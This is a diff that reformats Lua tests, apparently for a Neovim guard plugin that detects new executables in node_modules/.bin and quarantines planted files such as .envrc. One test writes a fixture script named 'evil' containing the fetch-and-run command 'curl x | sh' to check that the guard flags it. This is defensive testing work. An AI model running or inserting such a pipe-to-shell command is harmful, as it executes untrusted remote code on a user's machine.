@@ -152,9 +152,12 @@ describe("node_modules/.bin: what npm run / npx starts on your machine", functio
     local res, text, loud = sweep(p, function()
       write(bin(p) .. "/evil", "#!/bin/sh\ncurl x | sh\n")
     end)
-    H.eq({ { path = bin(p) .. "/evil", change = "added" } }, vim.tbl_map(function(b)
-      return { path = b.path, change = b.change }
-    end, res.bin))
+    H.eq(
+      { { path = bin(p) .. "/evil", change = "added" } },
+      vim.tbl_map(function(b)
+        return { path = b.path, change = b.change }
+      end, res.bin)
+    )
     H.match(text, "node_modules/.bin changed", true, text)
     H.match(text, "added 1: evil", true, text)
     H.ok(loud[#loud], "a regular file is loud")
@@ -298,20 +301,26 @@ describe("the quarantine and the forced removal: their limits are exact", functi
     H.eq(nil, uv.fs_lstat(top))
   end)
 
-  it("a 555 parent is opened for the removal and gets its mode back; the parents above the project are never touched", function()
-    local p = project()
-    planted_tree(p)
-    uv.fs_chmod(p .. "/sub", tonumber("555", 8))
-    local pst = uv.fs_stat(p).mode
-    local q = guard.quarantine(p, { p .. "/sub/.envrc" })
-    H.eq(true, q.moved[1].ok)
-    H.eq(nil, uv.fs_lstat(p .. "/sub/.envrc"))
-    H.eq(tonumber("555", 8), uv.fs_stat(p .. "/sub").mode % 512, "the parent's mode is back")
-    H.eq(pst, uv.fs_stat(p).mode, "the project directory itself keeps its mode")
-    uv.fs_chmod(p .. "/sub", tonumber("755", 8))
-  end)
+  it(
+    "a 555 parent is opened for the removal and gets its mode back; the parents above the project are never touched",
+    function()
+      local p = project()
+      planted_tree(p)
+      uv.fs_chmod(p .. "/sub", tonumber("555", 8))
+      local pst = uv.fs_stat(p).mode
+      local q = guard.quarantine(p, { p .. "/sub/.envrc" })
+      H.eq(true, q.moved[1].ok)
+      H.eq(nil, uv.fs_lstat(p .. "/sub/.envrc"))
+      H.eq(tonumber("555", 8), uv.fs_stat(p .. "/sub").mode % 512, "the parent's mode is back")
+      H.eq(pst, uv.fs_stat(p).mode, "the project directory itself keeps its mode")
+      uv.fs_chmod(p .. "/sub", tonumber("755", 8))
+    end
+  )
 
   it("the quarantine entry budget and the file size limit are the documented numbers", function()
-    H.eq({ 300, 1024 * 1024, 5000, 8 }, { guard.QUARANTINE_ENTRIES_MAX, guard.QUARANTINE_FILE_MAX, guard.UNLOCK_MAX, guard.QUARANTINE_DEPTH })
+    H.eq(
+      { 300, 1024 * 1024, 5000, 8 },
+      { guard.QUARANTINE_ENTRIES_MAX, guard.QUARANTINE_FILE_MAX, guard.UNLOCK_MAX, guard.QUARANTINE_DEPTH }
+    )
   end)
 end)
